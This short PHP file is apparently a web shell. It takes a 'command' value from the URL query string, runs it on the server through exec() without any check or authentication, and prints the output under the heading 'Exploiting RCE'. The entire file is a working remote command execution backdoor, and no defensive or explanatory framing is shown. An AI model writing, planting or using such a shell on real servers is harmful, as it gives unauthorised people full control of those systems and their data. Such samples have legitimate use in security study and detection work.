<?php
$command = isset($_GET['command']) ? $_GET['command'] : '';
$output = [];
$return_var = 0;
exec($command, $output, $return_var);
echo '<h1>Exploiting RCE</h1>';
echo 'Command: '.$command;
echo '\n<pre>';
echo implode("\n", $output);
echo '</pre>';
?>